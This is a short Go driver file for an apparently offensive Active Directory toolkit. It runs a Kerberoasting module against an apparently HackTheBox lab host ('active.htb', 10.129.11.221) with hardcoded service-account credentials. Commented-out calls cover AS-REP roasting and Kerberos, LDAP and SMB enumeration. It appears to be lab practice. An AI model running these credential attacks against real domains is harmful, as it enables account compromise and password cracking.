package main

import (
	"divine-dragon/remote_exploit"
)

func main() {
	// asrep_module := remote_exploit.SetupModule("htb.local", "10.129.40.155", false, false, false, "", "remote_exploit/names.txt", "", 10, 0)
	// asrep_module.Run()

	// kerberos_enum_module := remote_enum.NewKerberosEnumUsersModule("support.htb", "10.129.86.142", false, true, false, "remote_exploit/names.txt", "", 10, 0)
	// kerberos_enum_module.Run()
	// ldap_enum_module := remote_enum.NewLdapEnumModule("active.htb", "10.129.11.221", "389", "SVC_TGS", "GPPstillStandingStrong2k18", "", true, "")
	// ldap_enum_module.Run()

	kerberoasting_module := remote_exploit.NewKerberoastingModule("active.htb", "10.129.11.221", "SVC_TGS", "GPPstillStandingStrong2k18", false, false, "", true, "")
	kerberoasting_module.Run()

	// smb_enum_module := remote_enum.NewSmbModuleNewLdapEnumModule("support.htb", "10.129.86.142", "445", "guest", "", "", true, "")
	// smb_enum_module.Run()
}
